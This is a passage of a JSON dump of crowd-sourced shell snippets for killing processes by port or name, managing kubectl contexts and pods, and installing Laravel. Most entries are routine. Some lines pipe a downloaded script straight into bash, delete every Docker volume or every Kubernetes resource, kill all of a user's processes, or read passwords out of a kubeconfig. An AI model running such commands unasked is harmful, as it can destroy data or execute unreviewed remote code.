    "reg_date": "2021-10-11T22:09:10.000Z"
  },
  {
    "id": 3213,
    "keyword": null,
    "link": null,
    "title": " kill all docker processes force",
    "description": "docker stop $(docker ps -a -q) \ndocker rm $(docker ps -a -q) \n",
    "reg_date": "2021-10-11T22:09:10.000Z"
  },
  {
    "id": 3214,
    "keyword": null,
    "link": null,
    "title": " kill all ports mac",
    "description": "sudo lsof -i tcp:3000  \nsudo lsof -i :3000 \nlsof -n -i TCP:8080 COMMAND   PID   USER   FD   TYPE             DEVICE SIZE/OFF NODE NAME node     54762   user   23u  IPv4 XXXXXXXXX      0t0  TCP 127.0.0.1:http-alt (LISTEN) PID // is second field in the response . Then, kill that process:  kill -9 54762 // here put PID number found on the table 54762\nsudo lsof -i :5955 \nsudo lsof -i <Port> sudo kill -9 <PID>\nkill -9 <PID> \n",
    "reg_date": "2021-10-11T22:09:10.000Z"
  },
  {
    "id": 3215,
    "keyword": null,
    "link": null,
    "title": " kill all process at port",
    "description": "kill -9 $(sudo lsof -t -i:8080) \nlsof -ti tcp:2525 | xargs kill\n",
    "reg_date": "2021-10-11T22:09:10.000Z"
  },
  {
    "id": 3216,
    "keyword": null,
    "link": null,
    "title": " kill all process that match in grep",
    "description": "kill -9 $(ps aux | grep KeyWordHere | awk '{print $2}')\nps aux | grep -ie amarok | awk '{print \"kill -9 \" $2}' ps aux | grep -ie amarok | awk '{print $2}' | xargs kill -9 \n",
    "reg_date": "2021-10-11T22:09:11.000Z"
  },
  {
    "id": 3217,
    "keyword": null,
    "link": null,
    "title": " kill all processes by name linux",
    "description": "ps -ef | grep 'myProcessName' | grep -v grep | awk '{print $2}' | xargs -r kill -9 \n###################################################### # How to Kill the supervisord process without the PID ###################################################### ps -ef | grep 'supervisord' | grep -v grep | awk '{print $2}' | xargs -r kill -9  \nkillall -u username pkill -u username\n",
    "reg_date": "2021-10-11T22:09:11.000Z"
  },
  {
    "id": 3218,
    "keyword": null,
    "link": null,
    "title": " kill all processes by user",
    "description": "killall -u user\nkill -9 -1\n",
    "reg_date": "2021-10-11T22:09:11.000Z"
  },
  {
    "id": 3219,
    "keyword": null,
    "link": null,
    "title": " kill all python processes ubuntu",
    "description": "sudo pkill python sudo pgrep python\n",
    "reg_date": "2021-10-11T22:09:11.000Z"
  },
  {
    "id": 3220,
    "keyword": null,
    "link": null,
    "title": " kill all server 5000 mac",
    "description": "#First run this, to get port information (with the port you want to kill) sudo lsof -i :3000   #Then run this, with <PID> replaced by the value in the column returned by previous command. kill -9 <PID>\nsudo lsof -i :3000 \nkill -9 <PID> \n",
    "reg_date": "2021-10-11T22:09:11.000Z"
  },
  {
    "id": 3221,
    "keyword": null,
    "link": null,
    "title": " kill app at port",
    "description": "#To list any process listening to the port 8080: lsof -i:8080  #To kill any process listening to the port 8080: kill $(lsof -t -i:8080)  #or more violently: kill -9 $(lsof -t -i:8080)\n",
    "reg_date": "2021-10-11T22:09:11.000Z"
  },
  {
    "id": 3222,
    "keyword": null,
    "link": null,
    "title": " kill local host bash",
    "description": "npx kill-port 8080 \nnetstat -ano | findstr :yourPortNumber  taskkill /PID typeyourPIDhere /F\nnetstat -ano | findstr :yourPortNumber tskill typeyourPIDhere \n",
    "reg_date": "2021-10-11T22:09:11.000Z"
  },
  {
    "id": 3223,
    "keyword": null,
    "link": null,
    "title": " kill localhost 3000 ubuntu",
    "description": "sudo kill -9 $(sudo lsof -t -i:3000) \nsudo kill -9 `sudo lsof -t -i:3002`\nsudo kill -9 `sudo lsof -t -i:{PORT_NUMBER}`\nsudo kill -9 $(sudo lsof -t -i:9001) \n",
    "reg_date": "2021-10-11T22:09:12.000Z"
  },
  {
    "id": 3224,
    "keyword": null,
    "link": null,
    "title": " kill logstash",
    "description": "ps -aux | grep logstash kill -9 <process-id>\n",
    "reg_date": "2021-10-11T22:09:12.000Z"
  },
  {
    "id": 3225,
    "keyword": null,
    "link": null,
    "title": " kill port",
    "description": "sudo kill -9 `sudo lsof -t -i:9001` \nkill -9 $(sudo lsof -t -i:8080) \nnpx kill-port 3000 \nsudo kill -9 $(sudo lsof -t -i:8080) \nkill -9 $(lsof -t -i tcp:8080) \n# Print PID of process bound on that port. fuser 8080/tcp  # Kill that process fuser -k 8080/tcp\nnetstat -aon | findstr 8080 taskkill /f /pid 77777 \nkill -9 $(sudo lsof -t -i:'portName') //Ex. if portname is 3000 //then we will execute \"kill -9 $(sudo lsof -t -i:3000)\"\n// Option 1: if you have npm@5.2.0^ version npx kill-port 8080  // Linux kill -9 $(lsof -t -i tcp:8080)  // Windows command line: for /f \"tokens=5\" %a in ('netstat -aon ^| find \":8080\" ^| find \"LISTENING\"') do taskkill /f /pid %a  // Windows bat-file: for /f \"tokens=5\" %%a in ('netstat -aon ^| find \":8080\" ^| find \"LISTENING\"') do taskkill /f /pid %%a \n:8080. C:\\Users\\psmith>netstat -ano|findstr \"PID :8080\" Proto Local Address Foreign Address State PID TCP 0.0.0.0:8081 0.0.0.0:0 LISTENING 18264  taskkill /pid 18264 /f\n",
    "reg_date": "2021-10-11T22:09:12.000Z"
  },
  {
    "id": 3226,
    "keyword": null,
    "link": null,
    "title": " kill port 3000",
    "description": "#First run this, to get port information (with the port you want to kill) sudo lsof -i :3000   #Then run this, with <PID> replaced by the value in the column returned by previous command. kill -9 <PID>\nsudo kill -9 `sudo lsof -t -i:9001` \nsudo lsof -i tcp:3000  \nkill -9 $(sudo lsof -t -i:8080) \nnpx kill-port 3000 \nkill $(lsof -t -i:3000)\n",
    "reg_date": "2021-10-11T22:09:12.000Z"
  },
  {
    "id": 3227,
    "keyword": null,
    "link": null,
    "title": " kill port in kali linux",
    "description": "sudo kill -9 $(sudo lsof -t -i:8000)\n",
    "reg_date": "2021-10-11T22:09:12.000Z"
  },
  {
    "id": 3228,
    "keyword": null,
    "link": null,
    "title": " kill port in mac",
    "description": "#First run this, to get port information (with the port you want to kill) sudo lsof -i :3000   #Then run this, with <PID> replaced by the value in the column returned by previous command. kill -9 <PID>\nsudo lsof -i :3000  kill -9 <PID>\nsudo lsof -i :3000 kill -9 PID\nsudo lsof -i tcp:3000  \nnpx kill-port 8080\nsudo lsof -i :3000 \n",
    "reg_date": "2021-10-11T22:09:12.000Z"
  },
  {
    "id": 3229,
    "keyword": null,
    "link": null,
    "title": " kill port in mac terminal",
    "description": "sudo lsof -i :3000  kill -9 <PID>\nnpx kill-port 8080\nsudo lsof -i :3000 \nsudo lsof -i :5955 \nkill -9 port\nkill $(lsof -ti:3000,3001,8080)\n",
    "reg_date": "2021-10-11T22:09:12.000Z"
  },
  {
    "id": 3230,
    "keyword": null,
    "link": null,
    "title": " kill port in windows",
    "description": "sudo kill -9 `sudo lsof -t -i:9001` \n#To list any process listening to the port 8080: lsof -i:8080  #To kill any process listening to the port 8080: kill $(lsof -t -i:8080)  #or more violently: kill -9 $(lsof -t -i:8080)\nnetstat -ano | findstr :3001 taskkill /PID <yourid> /F\nkill -9 $(sudo lsof -t -i:8080) \nnpx kill-port 3000 \nnetstat -ano | findstr : <port> taskkill /PID <PID> /F\n",
    "reg_date": "2021-10-11T22:09:13.000Z"
  },
  {
    "id": 3231,
    "keyword": null,
    "link": null,
    "title": " kill port linux",
    "description": "sudo kill -9 `sudo lsof -t -i:9001` \n#To list any process listening to the port 8080: lsof -i:8080  #To kill any process listening to the port 8080: kill $(lsof -t -i:8080)  #or more violently: kill -9 $(lsof -t -i:8080)\nkill -9 $(sudo lsof -t -i:8080) \nkill -9 $(lsof -t -i:8080)\nsudo kill -9 `sudo lsof -t -i:3002`\nsudo kill -9 `sudo lsof -t -i:{PORT_NUMBER}`\n",
    "reg_date": "2021-10-11T22:09:13.000Z"
  },
  {
    "id": 3232,
    "keyword": null,
    "link": null,
    "title": " kill process at a port ubuntu",
    "description": "sudo kill -9 `sudo lsof -t -i:9001`\nsudo kill -9 `sudo lsof -t -i:3002`\nsudo kill -9 `sudo lsof -t -i:{PORT_NUMBER}`\nsudo kill -9 $(sudo lsof -t -i:9001) \n",
    "reg_date": "2021-10-11T22:09:13.000Z"
  },
  {
    "id": 3233,
    "keyword": null,
    "link": null,
    "title": " kill process cmd",
    "description": "taskkill /f /im notepad.exe /t taskkill /f /im chrome.exe /t\n## check and kill used \"ports\" netstat -ano | findstr :8080 taskkill /PID <yourid> /F\nnetstat -ano | findstr :3000 taskkill /PID \"123\" /F \n// Kill process by exe name taskkill /IM \"ProcessName.exe\" /F\ntaskkill /PID 1234\ntaskkill /F /PID pid_number\n",
    "reg_date": "2021-10-11T22:09:14.000Z"
  },
  {
    "id": 3234,
    "keyword": null,
    "link": null,
    "title": " kill process linux using port",
    "description": "kill -9 $(lsof -t -i tcp:8080) \nsudo kill -9 $(sudo lsof -t -i:9001) \nsudo kill -9 $(sudo lsof -t -i:8000)\nfuser -k 8080/tcp\n",
    "reg_date": "2021-10-11T22:09:14.000Z"
  },
  {
    "id": 3235,
    "keyword": null,
    "link": null,
    "title": " kill process on port",
    "description": "sudo kill -9 `sudo lsof -t -i:9001` \n#To list any process listening to the port 8080: lsof -i:8080  #To kill any process listening to the port 8080: kill $(lsof -t -i:8080)  #or more violently: kill -9 $(lsof -t -i:8080)\nnetstat -ano | findstr :3001 taskkill /PID <yourid> /F\n# To list any process listening to the port 8080: lsof -i:8080  # To kill any process listening to the port 8080: kill $(lsof -t -i:8080)  # or more violently: kill -9 $(lsof -t -i:8080) # (-9 corresponds to the SIGKILL - terminate immediately/hard kill signal: see List of Kill Signals and What is the purpose of the -9 option in the kill command?. If no signal is specified to kill, the TERM signal a.k.a. -15 or soft kill is sent, which sometimes isn't enough to kill a process.).\n#list process running on specified port (here 80, change to your port) sudo lsof -i:80  #kill process on specified port (here 80, change to your port) sudo kill $(sudo lsof -t -i:80)\nlsof -i:3000           // Change 3000 to whatever your port is! sudo kill 9 <PID>      // Change <PID> to the Pid number the above command returns \n",
    "reg_date": "2021-10-11T22:09:14.000Z"
  },
  {
    "id": 3236,
    "keyword": null,
    "link": null,
    "title": " kill process on port windows",
    "description": "#To list any process listening to the port 8080: lsof -i:8080  #To kill any process listening to the port 8080: kill $(lsof -t -i:8080)  #or more violently: kill -9 $(lsof -t -i:8080)\nnetstat -ano | findstr :3001 taskkill /PID <yourid> /F\nnetstat  -ano  |  findstr  <Port Number> taskkill  /F  /PID  <Process Id>\nnetstat -ano | findstr \"PORT_NUMBER\"  taskkill /PID PORT_NUMBER /f\nnetstat -ano | findstr :8080 taskkill /PID <yourid> /F\nCheck this gist https://gist.github.com/abhagsain/620120eb99cc5944d478a23757f9e00f\n",
    "reg_date": "2021-10-11T22:09:14.000Z"
  },
  {
    "id": 3237,
    "keyword": null,
    "link": null,
    "title": " kill process running on port in windows",
    "description": "netstat -ano | findstr :8080 taskkill /PID <yourid> /F\ntaskkill /F /PID PORT_NUMBER\nKill Process in Windows  Step 1:  Open up cmd.exe (note: you may need to run it as an administrator, but this isn't always necessary), then run the below command:  netstat -ano | findstr :PORT_NUMBER  (Replace PORT_NUMBER with the port number you want, but keep the colon)    The area circled in red shows the PID (process identifier). Locate the PID of the process that's using the port you want.  Step 2:  Next, run the following command:  taskkill /PID PORT_NUMBER /F    \nnetstat -ano | findstr :yourPortNumber  taskkill /PID typeyourPIDhere /F\n",
    "reg_date": "2021-10-11T22:09:14.000Z"
  },
  {
    "id": 3238,
    "keyword": null,
    "link": null,
    "title": " kill process running on port mac",
    "description": "#First run this, to get port information (with the port you want to kill) sudo lsof -i :3000   #Then run this, with <PID> replaced by the value in the column returned by previous command. kill -9 <PID>\nsudo lsof -i :3000  kill -9 <PID>\n#To list any process listening to the port 8080: lsof -i:8080  #To kill any process listening to the port 8080: kill $(lsof -t -i:8080)  #or more violently: kill -9 $(lsof -t -i:8080)\nsudo lsof -i tcp:3000  \nnpx kill-port 8080\nsudo lsof -i :3000 \n",
    "reg_date": "2021-10-11T22:09:15.000Z"
  },
  {
    "id": 3239,
    "keyword": null,
    "link": null,
    "title": " kill screen",
    "description": "killall screen\n$ screen -X -S [session # you want to kill] quit \nscreen -X -S enter_screen_id_here kill\nscreen -ls screen -XS [screen sessionid] quit #eg: screen -XS 20411 quit\n",
    "reg_date": "2021-10-11T22:09:15.000Z"
  },
  {
    "id": 3240,
    "keyword": null,
    "link": null,
    "title": " kill service by port number on windows",
    "description": "netstat -ano | findstr \"PORT_NUMBER\"  taskkill /PID PORT_NUMBER /f\ntaskkill /F /PID PORT_NUMBER\nkill $(lsof -t -i:8080) //kill port 8080\n",
    "reg_date": "2021-10-11T22:09:15.000Z"
  },
  {
    "id": 3241,
    "keyword": null,
    "link": null,
    "title": " kill skype ubuntu",
    "description": "kill -9 $(pgrep skype)\n",
    "reg_date": "2021-10-11T22:09:15.000Z"
  },
  {
    "id": 3242,
    "keyword": null,
    "link": null,
    "title": " kill the port in mac",
    "description": "sudo lsof -i tcp:3000  \n",
    "reg_date": "2021-10-11T22:09:15.000Z"
  },
  {
    "id": 3243,
    "keyword": null,
    "link": null,
    "title": " kill the process running on 8080",
    "description": "netstat  -ano  |  findstr  <Port Number> \ntaskkill /F /PID PORT_NUMBER\ntaskkill  /F  /PID  <Process Id> \nC:\\Users\\RevisitClass>netstat -ano | findstr 8080   TCP    0.0.0.0:18080          0.0.0.0:0              LISTENING       19788   TCP    [::]:18080             [::]:0                 LISTENING       19788 \nC:\\Users\\RevisitClass>taskkill /F /PID 19788 SUCCESS: The process with PID 19788 has been terminated. \n",
    "reg_date": "2021-10-11T22:09:15.000Z"
  },
  {
    "id": 3244,
    "keyword": null,
    "link": null,
    "title": " kill ubuntu port",
    "description": "sudo kill -9 `sudo lsof -t -i:9001` \nsudo kill -9 `sudo lsof -t -i:3002`\nsudo kill -9 `sudo lsof -t -i:{PORT_NUMBER}`\nfuser -n tcp -k 4000  \nsudo lsof -t -i:9001\n fuser -k -n tcp 3000 \n",
    "reg_date": "2021-10-11T22:09:15.000Z"
  },
  {
    "id": 3245,
    "keyword": null,
    "link": null,
    "title": " kill vlc in linux",
    "description": "ps aux | grep vlc sudo kill -9 PID\n",
    "reg_date": "2021-10-11T22:09:16.000Z"
  },
  {
    "id": 3246,
    "keyword": null,
    "link": null,
    "title": " kill x-server",
    "description": "pkill -f '^/usr/bin/X '\nsudo systemctl stop sddm.service\nsudo service lightdm restart\nsudo systemctl restart lightdm.service\n",
    "reg_date": "2021-10-11T22:09:16.000Z"
  },
  {
    "id": 3247,
    "keyword": null,
    "link": null,
    "title": " kill xcode from command line",
    "description": "#!/bin/bash echo \"Killing xcode...\" kill $(ps aux | grep 'Xcode' | awk '{print $2}') \n",
    "reg_date": "2021-10-11T22:09:16.000Z"
  },
  {
    "id": 3248,
    "keyword": null,
    "link": null,
    "title": " killall command not found ubuntu",
    "description": "aptitude install psmisc\n",
    "reg_date": "2021-10-11T22:09:16.000Z"
  },
  {
    "id": 3249,
    "keyword": null,
    "link": null,
    "title": " km  player in ubuntu 20",
    "description": "# sudo apt-get install kmplayer\n",
    "reg_date": "2021-10-11T22:09:16.000Z"
  },
  {
    "id": 3250,
    "keyword": null,
    "link": null,
    "title": " knex migration alter table already exists",
    "description": "docker volume rm $(docker volume ls -q)\n",
    "reg_date": "2021-10-11T22:09:16.000Z"
  },
  {
    "id": 3251,
    "keyword": null,
    "link": null,
    "title": " kube delete cronjob",
    "description": "kubectl delete cronjob hello \n",
    "reg_date": "2021-10-11T22:09:16.000Z"
  },
  {
    "id": 3252,
    "keyword": null,
    "link": null,
    "title": " kubectl change namespace",
    "description": "kubectl config set-context --current --namespace=my-namespace\nkubectl config set-context --current --namespace=<insert-namespace-name-here> # Validate it kubectl config view --minify | grep namespace:\n# Create Namespace in current cluster kubectl create namespace my-namespace\n# Create NS kubectl create namespace my-namespace # Select NS kubectl config set-context --current --namespace=my-namespace # Check current NS kubectl config view | grep namespace\n",
    "reg_date": "2021-10-11T22:09:17.000Z"
  },
  {
    "id": 3253,
    "keyword": null,
    "link": null,
    "title": " kubectl completion zsh",
    "description": "curl -LO https://storage.googleapis.com/kubernetes-release/release/v1.18.0/bin/linux/amd64/kubectl chmod +x ./kubectl sudo mv ./kubectl /usr/local/bin/kubectl kubectl version --client\necho 'source <(kubectl completion zsh)' >>~/.zshrc  # If you want to enable it with an alias echo 'alias k=kubectl' >>~/.zshrc echo 'complete -F __start_kubectl k' >>~/.zshrc\n",
    "reg_date": "2021-10-11T22:09:17.000Z"
  },
  {
    "id": 3254,
    "keyword": null,
    "link": null,
    "title": " kubectl connect eks",
    "description": "aws eks --region region update-kubeconfig --name cluster_name\n",
    "reg_date": "2021-10-11T22:09:17.000Z"
  },
  {
    "id": 3255,
    "keyword": null,
    "link": null,
    "title": " kubectl copy secret namespace",
    "description": "kubectl get secret <secrt_name> --namespace=<namespace1_name> --export -o yaml |\\     kubectl apply --namespace=<namespace2_name> -f -\n",
    "reg_date": "2021-10-11T22:09:17.000Z"
  },
  {
    "id": 3256,
    "keyword": null,
    "link": null,
    "title": " kubectl delete all pods",
    "description": "kubectl delete --all pods\nkubectl delete --all pods --namespace default\nkubectl delete pod podname\nkubectl delete all --all kubectl delete namespace <name_of_namespace>\n",
    "reg_date": "2021-10-11T22:09:17.000Z"
  },
  {
    "id": 3257,
    "keyword": null,
    "link": null,
    "title": " kubectl delete pods",
    "description": "kubectl delete --all pods\nkubectl delete pods <pod> --grace-period=0 --force \nkubectl delete pod podname\n$ kubectl get pods -n default --no-headers=true | awk '/web-app/{print $1}'| xargs  kubectl delete -n default podpod \"web-app-7fb4f5bff9-8crgx\" deletedpod \"web-app-7fb4f5bff9-ftzfd\" deletedpod \"web-app-7fb4f5bff9-rrkt2\" deleted\n",
    "reg_date": "2021-10-11T22:09:18.000Z"
  },
  {
    "id": 3258,
    "keyword": null,
    "link": null,
    "title": " kubectl exec bash",
    "description": "kubectl exec --stdin --tty shell-demo -- /bin/bash \nsudo kubectl -n <namespace> --context=<context-with-access> exec <pod-name> -it /bin/bash  ex: sudo kubectl -n default --context=staging-devops exec microservice1-jd830k-880 -it /bin/bash\nkubectl exec -it <pod-name> -n <namespace> -- <command>  example: -------- kubectl exec -it tag-mgmt -n my-namespace -- /bin/sh kubectl exec -it timescaledb -n data-store -- psql  timescaledb -> is pod name  data-store -> is namespace psql -> is command that we can run for postgres\nkubectl exec <pod_name> -- ls -la /\n",
    "reg_date": "2021-10-11T22:09:18.000Z"
  },
  {
    "id": 3259,
    "keyword": null,
    "link": null,
    "title": " kubectl install ubuntu 20.04",
    "description": "sudo apt update sudo apt -y install curl apt-transport-https curl -s https://packages.cloud.google.com/apt/doc/apt-key.gpg | sudo apt-key add - echo \"deb https://apt.kubernetes.io/ kubernetes-xenial main\" | sudo tee /etc/apt/sources.list.d/kubernetes.list sudo apt update sudo apt install kubectl\ncurl -LO \"https://storage.googleapis.com/kubernetes-release/release/$(curl -s https://storage.googleapis.com/kubernetes-release/release/stable.txt)/bin/linux/amd64/kubectl\" \nsudo apt update sudo apt -y upgrade && sudo systemctl reboot\n",
    "reg_date": "2021-10-11T22:09:18.000Z"
  },
  {
    "id": 3260,
    "keyword": null,
    "link": null,
    "title": " kubectl list context",
    "description": "# list kubernets contexts kubectl config get-contexts\nkubectl config view # Show Merged kubeconfig settings.  # use multiple kubeconfig files at the same time and view merged config KUBECONFIG=~/.kube/config:~/.kube/kubconfig2   kubectl config view  # get the password for the e2e user kubectl config view -o jsonpath='{.users[?(@.name == \"e2e\")].user.password}'  kubectl config view -o jsonpath='{.users[].name}'    # display the first user kubectl config view -o jsonpath='{.users[*].name}'   # get a list of users kubectl config get-contexts                          # display list of contexts  kubectl config current-context                       # display the current-context kubectl config use-context my-cluster-name           # set the default context to my-cluster-name  # add a new user to your kubeconf that supports basic auth kubectl config set-credentials kubeuser/foo.kubernetes.com --username=kubeuser --password=kubepassword  # permanently save the namespace for all subsequent kubectl commands in that context. kubectl config set-context --current --namespace=ggckad-s2  # set a context utilizing a specific username and namespace. kubectl config set-context gce --user=cluster-admin --namespace=foo \\   && kubectl config use-context gce  kubectl config unset users.foo                       # delete user foo \n# Get pods in default namespace kubectl get pods  #Get Pods in my-namespace kubectl get pods -n my-namespace  #Get Pods in all namespaces kubectl get pods --all-namespaces\n",
    "reg_date": "2021-10-11T22:09:18.000Z"
  },
  {
    "id": 3261,
    "keyword": null,
    "link": null,
    "title": " kubectl switch context",
    "description": "kubectl config use-context my-context\nkubectl config view # Show Merged kubeconfig settings.  # use multiple kubeconfig files at the same time and view merged config KUBECONFIG=~/.kube/config:~/.kube/kubconfig2   kubectl config view  # get the password for the e2e user kubectl config view -o jsonpath='{.users[?(@.name == \"e2e\")].user.password}'  kubectl config view -o jsonpath='{.users[].name}'    # display the first user kubectl config view -o jsonpath='{.users[*].name}'   # get a list of users kubectl config get-contexts                          # display list of contexts  kubectl config current-context                       # display the current-context kubectl config use-context my-cluster-name           # set the default context to my-cluster-name  # add a new user to your kubeconf that supports basic auth kubectl config set-credentials kubeuser/foo.kubernetes.com --username=kubeuser --password=kubepassword  # permanently save the namespace for all subsequent kubectl commands in that context. kubectl config set-context --current --namespace=ggckad-s2  # set a context utilizing a specific username and namespace. kubectl config set-context gce --user=cluster-admin --namespace=foo \\   && kubectl config use-context gce  kubectl config unset users.foo                       # delete user foo \n",
    "reg_date": "2021-10-11T22:09:18.000Z"
  },
  {
    "id": 3262,
    "keyword": null,
    "link": null,
    "title": " kubectl switch namespace command",
    "description": "kubectl config set-context --current --namespace=<insert-namespace-name-here> # Validate it kubectl config view --minify | grep namespace:\n",
    "reg_date": "2021-10-11T22:09:18.000Z"
  },
  {
    "id": 3263,
    "keyword": null,
    "link": null,
    "title": " kubectl to  show label of pod",
    "description": "kubectl get pods --show-labels \nkubectl label pods labelex owner=michael \n# Get pods in default namespace kubectl get pods  #Get Pods in my-namespace kubectl get pods -n my-namespace  #Get Pods in all namespaces kubectl get pods --all-namespaces\nkubectl apply -f https://raw.githubusercontent.com/openshift-evangelists/kbe/main/specs/labels/pod.yaml \nNAME        READY     STATUS    RESTARTS   AGE    LABELS labelex     1/1       Running   0          16m    env=development,owner=michael \nNAME       READY     STATUS    RESTARTS   AGE    LABELS labelex    1/1       Running   0          10m    env=development \n",
    "reg_date": "2021-10-11T22:09:18.000Z"
  },
  {
    "id": 3264,
    "keyword": null,
    "link": null,
    "title": " kubectl use context",
    "description": "kubectl config use-context my-context\nkubectl config view # Show Merged kubeconfig settings.  # use multiple kubeconfig files at the same time and view merged config KUBECONFIG=~/.kube/config:~/.kube/kubconfig2   kubectl config view  # get the password for the e2e user kubectl config view -o jsonpath='{.users[?(@.name == \"e2e\")].user.password}'  kubectl config view -o jsonpath='{.users[].name}'    # display the first user kubectl config view -o jsonpath='{.users[*].name}'   # get a list of users kubectl config get-contexts                          # display list of contexts  kubectl config current-context                       # display the current-context kubectl config use-context my-cluster-name           # set the default context to my-cluster-name  # add a new user to your kubeconf that supports basic auth kubectl config set-credentials kubeuser/foo.kubernetes.com --username=kubeuser --password=kubepassword  # permanently save the namespace for all subsequent kubectl commands in that context. kubectl config set-context --current --namespace=ggckad-s2  # set a context utilizing a specific username and namespace. kubectl config set-context gce --user=cluster-admin --namespace=foo \\   && kubectl config use-context gce  kubectl config unset users.foo                       # delete user foo \nkubectl rollout restart deployment yourDeploymentName \n",
    "reg_date": "2021-10-11T22:09:19.000Z"
  },
  {
    "id": 3265,
    "keyword": null,
    "link": null,
    "title": " kubernetes combine logs all replicas",
    "description": "kubectl logs -l app=myapp\n",
    "reg_date": "2021-10-11T22:09:19.000Z"
  },
  {
    "id": 3266,
    "keyword": null,
    "link": null,
    "title": " kubernetes get namespace",
    "description": "kubectl config set-context --current --namespace=<insert-namespace-name-here> # Validate it kubectl config view --minify | grep namespace:\n# Get Namespaces for current cluster kubectl get namespaces\n# Create Namespace in current cluster kubectl create namespace my-namespace\n# Create NS kubectl create namespace my-namespace # Select NS kubectl config set-context --current --namespace=my-namespace # Check current NS kubectl config view | grep namespace\n",
    "reg_date": "2021-10-11T22:09:19.000Z"
  },
  {
    "id": 3267,
    "keyword": null,
    "link": null,
    "title": " laravel: command not found",
    "description": "export PATH=\"$PATH:$HOME/.composer/vendor/bin\" \nexport PATH=~/.config/composer/vendor/bin:$PATH  source ~/.bashrc\necho 'export PATH=\"~/.config/composer/vendor/bin\"' >> ~/.bashrc # or echo 'export PATH=\"~/.config/composer/vendor/bin\"' >> ~/.zshrc\n#these commands executed on Ubunyu 20.04 export PATH=~/.config/composer/vendor/bin:$PATH source ~/.bashrc\n#For Ubuntu 20.04 this will add laravel command to your PATH from CLI #and append (>>) with standard output (echo) to your ~/.bashrc file echo 'export PATH=\"$PATH:$HOME/.config/composer/vendor/bin\"' >> ~/.bashrc #Make sure your terminal does actually use ~/.bashrc and not ~/.bash_profile #reload terminal path config source ~/.bashrc\nsource ~/.bashrc \n",
    "reg_date": "2021-10-11T22:09:19.000Z"
  },
  {
    "id": 3268,
    "keyword": null,
    "link": null,
    "title": " laravel 6",
    "description": "composer create-project --prefer-dist laravel/laravel blog \"6.*\"\n# Via Laravel Installer composer global require laravel/installer laravel new blog  # Via Composer Create-Project composer create-project --prefer-dist laravel/laravel blog\n",
    "reg_date": "2021-10-11T22:09:19.000Z"
  },
  {
    "id": 3269,
    "keyword": null,
    "link": null,
    "title": " laravel 8 composer install",
    "description": "Laravel 8* install composer comand  composer create-project laravel/laravel example-app  cd example-app  php artisan serve\ncomposer create-project --prefer-dist laravel/laravel test \"8.*\"\n// To install and use a specific version, you can enter it at the end of the command. // For example using version 5.8 ==> composer create-project --prefer-dist laravel/laravel projectName \"5.8.*\"\ncomposer create-project --prefer-dist laravel/laravel ProjectName dev-develop\ncurl -s https://laravel.build/app-name | bash <!-- OR --> composer create-project --prefer-dist laravel/laravel app-name \"8.*\"\n******************************************* *** SETTING UP LARAVEL 8 (Simple steps) *** *******************************************  **Ensure you computer already has PHP and Composer installed. Then apply the CLI commands below.  ** Vist \"https://www.apachefriends.org/index.html\" to install PHP via XAMPP ** Visit \"https://getcomposer.org/\" to install composer   ENTER CLI TERMINAL COMMANDS below ------------------------------------ > composer create-project laravel/laravel example-app  > cd example-app  > php artisan serve  > composer require laravel/ui  > php artisan ui vue --auth  Now you will have to ensure you setup your database variables in the  .env file of your laravel project so you can migrate your database.  > php artisan migrate  **At this stage, your laravel app is fully ready with  login authentication for development   DEPLOY APP TO ONLINE LINUX SERVER --------------------------------- [1] Delete the file called \"Server.php\" in the Laravel Project directory  [2] Copy your laravel 8 project to your web server \"Public_html\" directory  [3] Simply copy all files in the \"Public_html\" folder of your  Laravel 8 Project and paste in the server web home directory  which is the servers own 'Public_html' folder which is also where Laravel project files are.  [4] Then update the index.php file by changing the directory levels e.g. change '/../storage/framework/maintenance.php' to '/storage/framework/maintenance.php' by removing the '../' in the directory syntax. Thats all! just refresh your browser and your app will be running fine.    -- By Atsu Emmanuel T. (Web Developer / Architecht) Email: atsuemmanuel@gmail.com   \n",
    "reg_date": "2021-10-11T22:09:19.000Z"
  },
  {
    "id": 3270,
    "keyword": null,
    "link": null,
    "title": " laravel command not found after installing laravel mac",
    "description": "export PATH=\"$PATH:$HOME/.composer/vendor/bin\" \nexport PATH=~/.config/composer/vendor/bin:$PATH  source ~/.bashrc\n",
    "reg_date": "2021-10-11T22:09:20.000Z"
  },
  {
    "id": 3271,
    "keyword": null,
    "link": null,
    "title": " laravel composer install",
    "description": "composer create-project --prefer-dist laravel/laravel blog \"6.*\"\nLaravel 8* install composer comand  composer create-project laravel/laravel .  php artisan serve\n1. composer create-project laravel/laravel example-app 2. cd example-app 3. php artisan serve\ncomposer global require \"laravel/installer\"\nYou can create project by 2 ways:  First is installing it without defining version: composer create-project laravel/laravel yourProjectName  Secondly you can install by defining version: composer create-project laravel/laravel=\"VersionOfYourChoice\" yourProjectName\ncomposer global require laravel/installer  laravel new blog\n",
    "reg_date": "2021-10-11T22:09:20.000Z"
  },
  {
    "id": 3272,
    "keyword": null,
    "link": null,
    "title": " laravel create controller",
    "description": "php artisan make:controller MyController\nphp artisan make:controller UserController\nphp artisan make:controller NameController\nphp artisan make:controller ShowProfile\nphp artisan make:controller MyController php artisan make:controller CompanyController --resource //To create with a Model php artisan make:controller CompanyController --resource --model=CompanyModel \nclass UserController extends Controller {     /**      * Instantiate a new controller instance.      *      * @return void      */     public function __construct()     {         $this->middleware('auth');          $this->middleware('log')->only('index');          $this->middleware('subscribed')->except('store');     } }\n",
    "reg_date": "2021-10-11T22:09:20.000Z"
  },
  {
    "id": 3273,
    "keyword": null,
    "link": null,
    "title": " laravel create model",
    "description": "# Create a new Drink model. php artisan make:model Drink \n# If you would like to generate a database migration when you  # generate the model, you may use the --migration or -m option:  php artisan make:model Flight --migration php artisan make:model Flight -m\n# The easiest way to create a model instance is using the  # make:model Artisan command:  php artisan make:model Flight  # If you would like to generate a database migration when you  # generate the model, you may use the --migration or -m option:  php artisan make:model Flight --migration php artisan make:model Flight -m\nphp artisan make:model Flight\nphp artisan make:model ModelName\n// If there's a flight from Oakland to San Diego, set the price to $99. // If no matching model exists, create one. $flight = App\\Models\\Flight::updateOrCreate(     ['departure' => 'Oakland', 'destination' => 'San Diego'],     ['price' => 99, 'discounted' => 1] );\n",
    "reg_date": "2021-10-11T22:09:20.000Z"
  },
  {
    "id": 3274,
    "keyword": null,
    "link": null,
    "title": " laravel create model and migration",
    "description": "php artisan make:model Model_Name -m\nphp artisan make:model ModelName --migration\nphp artisan make:model Settings -m\n# If you would like to generate a database migration when you  # generate the model, you may use the --migration or -m option:  php artisan make:model Flight --migration php artisan make:model Flight -m\nphp artisan make:model Flight\nphp artisan make:Model Status -m\n",
    "reg_date": "2021-10-11T22:09:20.000Z"
  },
  {
    "id": 3275,
